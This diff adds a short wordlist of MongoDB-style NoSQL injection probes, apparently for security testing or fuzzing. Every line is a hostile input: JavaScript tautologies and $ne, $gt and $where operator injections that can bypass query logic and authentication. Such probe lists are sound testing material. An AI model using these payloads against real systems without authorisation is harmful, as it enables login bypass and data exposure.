@@ -1,0 +1,6 @@
+# NoSQLi probes (Mongo-flavoured)
+' || 1==1//
+'; return true; var x='
+{"$ne": null}
+{"$gt": ""}
+true, $where: '1 == 1'
